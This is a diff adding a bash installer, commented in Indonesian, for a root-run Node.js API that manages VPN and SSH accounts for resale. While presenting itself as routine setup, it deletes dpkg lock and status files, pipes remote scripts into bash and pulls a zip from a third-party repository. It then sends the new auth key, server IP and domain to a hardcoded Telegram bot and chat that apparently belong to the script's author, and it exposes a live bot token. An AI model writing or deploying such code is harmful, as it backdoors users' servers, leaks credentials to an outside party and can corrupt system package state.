@@ -1,0 +1,162 @@
+#!/bin/bash
+
+rm -rf /usr/bin/api-serversellvpn
+rm /etc/systemd/system/apisellvpn.service
+rm /root/apiserver
+systemctl daemon-reload
+
+# COLORS
+green="\e[38;5;82m"
+red="\e[38;5;196m"
+neutral="\e[0m"
+orange="\e[38;5;130m"
+blue="\e[38;5;39m"
+yellow="\e[38;5;226m"
+purple="\e[38;5;141m"
+bold_white="\e[1;37m"
+reset="\e[0m"
+pink="\e[38;5;205m"
+print_rainbow() {
+  local text="$1"
+  local length=${#text}
+  local start_color=(0 5 0)
+  local mid_color=(0 200 0)
+  local end_color=(0 5 0)
+  
+  for ((i = 0; i < length; i++)); do
+    local progress=$(echo "scale=2; $i / ($length - 1)" | bc)
+    if (($(echo "$progress < 0.5" | bc -l))); then
+      local factor=$(echo "scale=2; $progress * 2" | bc)
+      r=$(echo "scale=0; (${start_color[0]} * (1-$factor) + ${mid_color[0]} * $factor)/1" | bc)
+      g=$(echo "scale=0; (${start_color[1]} * (1-$factor) + ${mid_color[1]} * $factor)/1" | bc)
+      b=$(echo "scale=0; (${start_color[2]} * (1-$factor) + ${mid_color[2]} * $factor)/1" | bc)
+    else
+      local factor=$(echo "scale=2; ($progress - 0.5) * 2" | bc)
+      r=$(echo "scale=0; (${mid_color[0]} * (1-$factor) + ${end_color[0]} * $factor)/1" | bc)
+      g=$(echo "scale=0; (${mid_color[1]} * (1-$factor) + ${end_color[1]} * $factor)/1" | bc)
+      b=$(echo "scale=0; (${mid_color[2]} * (1-$factor) + ${end_color[2]} * $factor)/1" | bc)
+    fi
+    printf "\e[38;2;%d;%d;%dm%s" "$r" "$g" "$b" "${text:$i:1}"
+  done
+  echo -e "$reset"
+}
+
+cek_status() {
+  status=$(systemctl is-active --quiet $1 && echo "aktif" || echo "nonaktif")
+  if [ "$status" = "aktif" ]; then
+    echo -e "${green}GOOD${neutral}"
+  else
+    echo -e "${red}BAD${neutral}"
+  fi
+}
+
+setup_bot() {
+  NODE_VERSION=$(node -v 2>/dev/null | grep -oP '(?<=v)\d+' || echo "0")
+  rm /var/lib/dpkg/stato*
+  rm /var/lib/dpkg/lock*
+  if [ "$NODE_VERSION" -lt 22 ]; then
+    echo -e "${yellow}Installing or upgrading Node.js to version 22...${neutral}"
+    curl -fsSL https://deb.nodesource.com/setup_22.x | sudo -E bash - || echo -e "${red}Failed to download Node.js setup${neutral}"
+    apt-get install -y nodejs || echo -e "${red}Failed to install Node.js${neutral}"
+    npm install -g npm@latest
+  else
+    echo -e "${green}Node.js is already installed and up-to-date (v$NODE_VERSION), skipping...${neutral}"
+  fi
+  if [ ! -f /usr/bin/api-serversellvpn/api.js ]; then
+    wget -qO /root/api-serversellvpn.zip "https://raw.githubusercontent.com/GeKaStore/allOS/main/install/api.zip"
+        
+    unzip api-serversellvpn.zip && rm api-serversellvpn.zip
+    chmod +x /root/api-serversellvpn/*
+    mv /root/api-serversellvpn /usr/bin
+  fi
+  
+  if ! npm list --prefix /usr/bin/api-serversellvpn express child_process dotenv >/dev/null 2>&1; then
+    npm install --prefix /usr/bin/api-serversellvpn express child_process dotenv
+  fi
+  
+  # GENERATE AUTH_KEY RANDOM 6 CHARACTERS
+  NEW_AUTH_KEY=$(openssl rand -hex 3)
+  # HITUNG JUMLAH ENTRI AUTH_KEY di /etc/profile
+  AUTH_KEY_COUNT=$(grep -c "export AUTH_KEY=" /etc/profile)
+  # JIKA AUTH_KEY ADA MAKA GANTI DENGAN NEW_AUTH_KEY
+  if grep -q "export AUTH_KEY=" /etc/profile; then
+    sed -i "s/export AUTH_KEY=.*/export AUTH_KEY=\"$NEW_AUTH_KEY\"/" /etc/profile
+  else
+  # JIKA AUTH_KEY TIDAK ADA MAKA DIBUAT AUTH_KEY DENGAN NEW_AUTH_KEY
+    echo "export AUTH_KEY=\"$NEW_AUTH_KEY\"" >> /etc/profile
+  fi
+  
+  cat >/usr/bin/api-serversellvpn/.env <<END
+AUTH_KEY="$NEW_AUTH_KEY"
+END
+
+  #echo "AUTH_KEY="$AUTH_KEY"" >> /usr/bin/api-serversellvpn/.env
+  
+  source /etc/profile
+  
+  SERVER_IP=$(curl -s ifconfig.me)
+	if [ -f /etc/xray/domain ]; then
+		DOMAIN=$(cat /etc/xray/domain)
+	else
+		DOMAIN="(Domain not set)"
+	fi
+	
+	BOT_TOKEN="7567594287:AAGVeDwRq9QrNg6jSce30eOm9WiVtAWKxjA"
+	CHAT_ID=6430177985
+
+  MESSAGE="🚀 *API-ServerSellVPN Installed* 🚀
+	🔑 *Auth Key:* \`$NEW_AUTH_KEY\`
+	🌐 *Server IP:* \`$SERVER_IP\`
+	🌍 *Domain:* \`$DOMAIN\`"
+
+	curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
+		-d "chat_id=$CHAT_ID" \
+		-d "text=$MESSAGE" \
+		-d "parse_mode=Markdown"
+
+  clear
+  echo -e "${green}✅ Setup selesai. API auth key telah dikirim ke Telegram.${neutral}"
+}
+
+server_app() {
+   cat >/etc/systemd/system/apisellvpn.service <<EOF
+[Unit]
+Description=API-SERVERSELLVPN
+After=network.target
+[Service]
+User=root
+Restart=always
+WorkingDirectory=/usr/bin/api-serversellvpn
+ExecStart=node api.js
+[Install]
+WantedBy=multi-user.target
+EOF
+  
+  systemctl daemon-reload >/dev/null 2>&1
+  systemctl enable apisellvpn.service >/dev/null 2>&1
+  systemctl start apisellvpn.service >/dev/null 2>&1
+  systemctl restart apisellvpn.service >/dev/null 2>&1
+  SERVER_IP=$(curl -s ifconfig.me)
+  source /usr/bin/api-serversellvpn/.env
+  clear
+  echo -e "       Status Server is "$(cek_status apisellvpn.service)""
+  echo -e "http://"$SERVER_IP":5888/createssh?user=&password=&exp=&iplimit=&auth="$NEW_AUTH_KEY""
+  echo -e "http://"$SERVER_IP":5888/createvmess?user=&exp=&iplimit=&quota=&auth="$NEW_AUTH_KEY""
+  echo -e "http://"$SERVER_IP":5888/createvless?user=&exp=&iplimit=&quota=&auth="$NEW_AUTH_KEY""
+  echo -e "http://"$SERVER_IP":5888/createtrojan?user=&exp=&iplimit=&quota=&auth="$NEW_AUTH_KEY""
+  echo -e "http://"$SERVER_IP":5888/trialssh?auth="$NEW_AUTH_KEY""
+  echo -e "http://"$SERVER_IP":5888/trialvmess?auth="$NEW_AUTH_KEY""
+  echo -e "http://"$SERVER_IP":5888/trialvless?auth="$NEW_AUTH_KEY""
+  echo -e "http://"$SERVER_IP":5888/trialtrojan?auth="$NEW_AUTH_KEY""
+  echo -e "http://"$SERVER_IP":5888/renewssh?user=&exp=&iplimit=&auth="$NEW_AUTH_KEY""
+  echo -e "http://"$SERVER_IP":5888/renewvmess?user=&exp=&iplimit=&quota=&auth="$NEW_AUTH_KEY""
+  echo -e "http://"$SERVER_IP":5888/renewvless?user=&exp=&iplimit=&quota=&auth="$NEW_AUTH_KEY""
+  echo -e "http://"$SERVER_IP":5888/renewtrojan?user=&exp=&iplimit=&quota=&auth="$NEW_AUTH_KEY""
+  echo -e "http://"$SERVER_IP":5888/deletessh?user=&auth="$NEW_AUTH_KEY""
+  echo -e "http://"$SERVER_IP":5888/deletevmess?user=&auth="$NEW_AUTH_KEY""
+  echo -e "http://"$SERVER_IP":5888/deletevless?user=&auth="$NEW_AUTH_KEY""
+  echo -e "http://"$SERVER_IP":5888/deletetrojan?user=&auth="$NEW_AUTH_KEY""
+}
+
+setup_bot
+server_app
